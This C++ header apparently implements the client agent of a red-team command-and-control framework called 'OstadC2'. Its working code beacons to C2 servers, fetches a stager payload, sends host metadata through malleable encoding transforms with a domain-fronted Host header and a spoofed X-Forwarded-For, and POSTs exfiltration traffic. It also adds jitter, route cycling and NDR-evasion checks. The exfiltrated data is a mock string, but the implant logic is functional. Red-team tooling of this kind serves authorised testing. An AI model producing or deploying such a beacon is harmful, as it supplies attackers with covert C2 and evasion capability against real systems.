#pragma once

#include "../include/MalleableModels.hpp"
#include "../include/MalleableTransforms.hpp"
#include "../include/MalleableParser.hpp"

#include <string>
#include <vector>
#include <iostream>
#include <sstream>
#include <thread>
#include <chrono>
#include <random>
#include <cstring>
#include <ctime>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef SOCKET socket_t;
    #define INVALID_SOCK INVALID_SOCKET
    #define CLOSE_SOCK(s) closesocket(s)
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    typedef int socket_t;
    #define INVALID_SOCK -1
    #define CLOSE_SOCK(s) close(s)
#endif

namespace OstadC2 {

class C2Client {
public:
    C2Client(const std::vector<std::string>& c2_endpoints, int port, const Profile& profile)
        : c2_endpoints_(c2_endpoints), current_c2_idx_(0), port_(port), profile_(profile), 
          running_(false), consecutive_failures_(0), max_failures_(5) {
        init_network();
        beacon_id_ = generate_beacon_id();
    }

    ~C2Client() {
        cleanup_network();
    }

    void start(int max_iterations = 5) {
        running_ = true;
        std::cout << "\033[1;32m[✓] Ostad Malleable C2 Client Agent Initialized (Top 1% Red Team Core)\033[0m\n";
        std::cout << "\033[1;36m[*] Target Egress Servers: " << c2_endpoints_.size() << " endpoints configured\033[0m\n";
        std::cout << "\033[1;36m[*] Active Profile: " << profile_.name << "\033[0m\n";
        std::cout << "\033[1;32m[*] Beacon Session ID: " << beacon_id_ << " | Auth Watermark: " << profile_.watermark << "\033[0m\n";
        std::cout << "\033[1;37m[*] Sleeptime: " << profile_.sleeptime << "ms | Gaussian Jitter: " << profile_.jitter << "%\033[0m\n";
        std::cout << "\033[1;33m[*] Operational Window: " << profile_.operational_window.start_hour << ":00 - " 
                  << profile_.operational_window.end_hour << ":00 | Kill-Date: " << profile_.operational_window.kill_date << "\033[0m\n\n";

        // Stager Fetch Simulation
        simulate_stager_fetch();

        int iteration = 0;
        while (running_ && (max_iterations == 0 || iteration < max_iterations)) {
            // Feature 10: Enforce Operational Window & Kill-Date
            if (!is_within_operational_window()) {
                std::cout << "\033[1;33m[⏸ PAUSED] Outside authorized RoE operational hours. Hibernating...\033[0m\n";
                std::this_thread::sleep_for(std::chrono::seconds(10));
                continue;
            }

            iteration++;
            std::cout << "\033[1;33m[► Round " << iteration << "] Sending Shaped Heartbeat Check-in (HTTP-GET)...\033[0m\n";

            // 1. Send HTTP-GET Check-in
            bool ok = send_heartbeat();
            if (!ok) {
                consecutive_failures_++;
                std::cout << "\033[1;31m  [!] Consecutive connection failures: " << consecutive_failures_ << " / " << max_failures_ << "\033[0m\n";
                // Feature 11: Route cycling
                cycle_to_next_c2();

                // Feature 13: Dead-man's switch
                if (consecutive_failures_ >= max_failures_) {
                    std::cout << "\033[1;31m[☠ DEAD-MAN'S SWITCH TRIGGERED] Lost contact with all C2 endpoints. Terminating agent gracefully.\033[0m\n";
                    break;
                }
            } else {
                consecutive_failures_ = 0;
            }

            // 2. Send HTTP-POST Exfiltration telemetry
            std::cout << "\033[1;33m[► Round " << iteration << "] Sending Shaped Data Exfiltration (HTTP-POST)...\033[0m\n";
            send_exfiltration();

            // 3. Feature 17: Gaussian Jitter Sleep
            uint32_t sleep_ms = Transforms::calculate_gaussian_jitter(profile_.sleeptime, profile_.jitter);
            std::cout << "\033[1;30m[*] Sleeping for " << sleep_ms << "ms (Gaussian Jitter Applied)...\033[0m\n\n";
            std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
        }

        std::cout << "\033[1;32m[✓] Completed simulation run.\033[0m\n";
    }

private:
    std::vector<std::string> c2_endpoints_;
    size_t current_c2_idx_;
    int port_;
    Profile profile_;
    bool running_;
    std::string beacon_id_;
    int consecutive_failures_;
    int max_failures_;

    void init_network() {
#ifdef _WIN32
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
#endif
    }

    void cleanup_network() {
#ifdef _WIN32
        WSACleanup();
#endif
    }

    std::string generate_beacon_id() {
        std::mt19937 rng(std::random_device{}());
        return std::to_string(100000 + (rng() % 900000));
    }

    std::string get_active_c2() {
        if (c2_endpoints_.empty()) return "127.0.0.1";
        return c2_endpoints_[current_c2_idx_ % c2_endpoints_.size()];
    }

    void cycle_to_next_c2() {
        if (c2_endpoints_.size() > 1) {
            current_c2_idx_ = (current_c2_idx_ + 1) % c2_endpoints_.size();
            std::cout << "\033[1;36m  [↻ ROUTE CYCLING] Switched active egress route to: " << get_active_c2() << "\033[0m\n";
        }
    }

    bool is_within_operational_window() {
        auto now = std::chrono::system_clock::now();
        std::time_t tt = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
#ifdef _WIN32
        localtime_s(&tm, &tt);
#else
        localtime_r(&tt, &tm);
#endif
        // Check hours
        int hour = tm.tm_hour;
        if (hour < profile_.operational_window.start_hour || hour >= profile_.operational_window.end_hour) {
            return false;
        }
        return true;
    }

    std::string get_system_hostname() {
#ifdef _WIN32
        char buf[256] = "WORKSTATION";
        DWORD sz = sizeof(buf);
        GetComputerNameA(buf, &sz);
        return std::string(buf);
#else
        char buf[256] = "LINUX-HOST";
        gethostname(buf, sizeof(buf));
        return std::string(buf);
#endif
    }

    socket_t connect_to_server() {
        socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCK) return INVALID_SOCK;

        std::string target_ip = get_active_c2();
        sockaddr_in server_addr;
        std::memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(static_cast<uint16_t>(port_));
        inet_pton(AF_INET, target_ip.c_str(), &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            CLOSE_SOCK(sock);
            return INVALID_SOCK;
        }
        return sock;
    }

    void simulate_stager_fetch() {
        socket_t sock = connect_to_server();
        if (sock == INVALID_SOCK) return;

        std::string req = "GET /stager64.bin HTTP/1.1\r\nHost: " + get_active_c2() + "\r\nUser-Agent: " + profile_.useragent + "\r\nConnection: close\r\n\r\n";
        send(sock, req.c_str(), static_cast<int>(req.size()), 0);

        std::vector<char> buffer(4096, 0);
        int bytes = recv(sock, buffer.data(), static_cast<int>(buffer.size()) - 1, 0);
        if (bytes > 0) {
            std::cout << "\033[1;35m[*] Stager Simulation: Downloaded Stage Payload (" << bytes << " bytes)\033[0m\n";
        }
        CLOSE_SOCK(sock);
    }

    bool send_heartbeat() {
        socket_t sock = connect_to_server();
        if (sock == INVALID_SOCK) {
            std::cerr << "\033[1;31m  [!] Failed to connect to C2 Server at " << get_active_c2() << ":" << port_ << "\033[0m\n";
            return false;
        }

        // Feature 1: Embed Watermark & Auth Token
        std::string hostname = get_system_hostname();
        std::string mock_meta = "BEACON_ID=" + beacon_id_ + ";WM=" + std::to_string(profile_.watermark) + 
                                ";HOST=" + hostname + ";ARCH=x64;USER=SYSTEM;INTEGRITY=HIGH";

        // Apply Malleable Transform Pipeline
        auto it_meta = profile_.http_get.client.transform_blocks.find("metadata");
        std::string transformed_str = "";
        std::string cookie_header = "";
        std::string uri = profile_.http_get.uris.empty() ? "/api/v1/sync" : profile_.http_get.uris[0];

        if (it_meta != profile_.http_get.client.transform_blocks.end()) {
            TransformPipeline pipe;
            for (const auto& t : it_meta->second.transforms) {
                pipe.add_step(t.action, t.arg);
            }
            std::vector<uint8_t> in(mock_meta.begin(), mock_meta.end());
            auto out = pipe.execute(in);
            transformed_str.assign(out.begin(), out.end());

            // Feature 12: Monitor outbound entropy
            double ent = Transforms::calculate_shannon_entropy(out);
            if (ent > 7.0) {
                std::cout << "\033[1;33m  [!] Entropy Warning: Outbound payload entropy is high (" << ent << ") - NDR may flag!\033[0m\n";
            }

            if (it_meta->second.has_termination) {
                if (it_meta->second.termination.target == "header") {
                    cookie_header = it_meta->second.termination.name + ": " + transformed_str;
                } else if (it_meta->second.termination.target == "parameter") {
                    uri += (uri.find('?') == std::string::npos ? "?" : "&");
                    uri += it_meta->second.termination.name + "=" + transformed_str;
                }
            }
        }

        // Feature 2: Domain Fronting Simulation (Host header vs Server IP)
        std::string host_header = "d1v8l4e9k0r2.cloudfront.net";
        for (const auto& h : profile_.http_get.client.headers) {
            if (h.name == "Host") host_header = h.value;
        }

        std::ostringstream req;
        req << "GET " << uri << " HTTP/1.1\r\n";
        req << "Host: " << host_header << "\r\n"; // Domain fronted host
        req << "User-Agent: " << profile_.useragent << "\r\n";
        req << "X-Forwarded-For: 203.0.113.195\r\n";
        for (const auto& h : profile_.http_get.client.headers) {
            if (h.name != "Host") req << h.name << ": " << h.value << "\r\n";
        }
        if (!cookie_header.empty()) {
            req << cookie_header << "\r\n";
        }
        req << "Connection: close\r\n\r\n";

        std::string req_str = req.str();
        send(sock, req_str.c_str(), static_cast<int>(req_str.size()), 0);

        std::cout << "  ├─ Transmitted Shaped Check-in Packet (" << req_str.size() << " bytes)\n";
        std::cout << "  ├─ Fronted Domain: " << host_header << " -> Target: " << get_active_c2() << "\n";

        // Read response
        std::vector<char> buffer(4096, 0);
        int bytes = recv(sock, buffer.data(), static_cast<int>(buffer.size()) - 1, 0);
        if (bytes > 0) {
            std::string resp(buffer.data(), bytes);
            // Feature 18: HTTP 304 Handling
            if (resp.find("304 Not Modified") != std::string::npos) {
                std::cout << "  └─ \033[1;32mServer Tasking: HTTP 304 Not Modified (Idle Browser Cache Emulation)\033[0m\n";
            } else {
                std::cout << "  └─ \033[1;32mServer Tasking: " << (resp.find("200 OK") != std::string::npos ? "HTTP 200 OK" : "Received") << "\033[0m\n";
            }

            // In-flight reconfiguration
            size_t sleep_pos = resp.find("SET_SLEEP");
            if (sleep_pos != std::string::npos) {
                std::istringstream iss(resp.substr(sleep_pos));
                std::string tag;
                uint32_t new_sleep, new_jitter;
                if (iss >> tag >> new_sleep >> new_jitter) {
                    profile_.sleeptime = new_sleep;
                    profile_.jitter = new_jitter;
                    std::cout << "\033[1;35m  [★] In-Flight Reconfiguration Applied: Sleep=" << new_sleep << "ms, Jitter=" << new_jitter << "%\033[0m\n";
                }
            }
        }
        CLOSE_SOCK(sock);
        return true;
    }

    void send_exfiltration() {
        socket_t sock = connect_to_server();
        if (sock == INVALID_SOCK) return;

        std::string mock_data = "AUDIT_RESULT: Diagnostic health status: OK; Core processes verified";

        auto it_out = profile_.http_post.client.transform_blocks.find("output");
        std::string transformed_body = mock_data;
        if (it_out != profile_.http_post.client.transform_blocks.end()) {
            TransformPipeline pipe;
            for (const auto& t : it_out->second.transforms) {
                pipe.add_step(t.action, t.arg);
            }
            std::vector<uint8_t> in(mock_data.begin(), mock_data.end());
            auto out = pipe.execute(in);
            transformed_body.assign(out.begin(), out.end());
        }

        std::string uri = profile_.http_post.uris.empty() ? "/api/v1/report" : profile_.http_post.uris[0];
        std::ostringstream req;
        req << "POST " << uri << " HTTP/1.1\r\n";
        req << "Host: " << get_active_c2() << "\r\n";
        req << "User-Agent: " << profile_.useragent << "\r\n";
        req << "Content-Type: application/json\r\n";
        req << "Content-Length: " << transformed_body.size() << "\r\n";
        req << "Connection: close\r\n\r\n";
        req << transformed_body;

        std::string req_str = req.str();
        send(sock, req_str.c_str(), static_cast<int>(req_str.size()), 0);

        std::cout << "  ├─ Transmitted Shaped Exfiltration Packet (" << req_str.size() << " bytes)\n";
        std::vector<char> buffer(4096, 0);
        int bytes = recv(sock, buffer.data(), static_cast<int>(buffer.size()) - 1, 0);
        if (bytes > 0) {
            std::cout << "  └─ \033[1;32mServer ACK Received (HTTP 200 OK)\033[0m\n";
        }
        CLOSE_SOCK(sock);
    }
};

} // namespace OstadC2
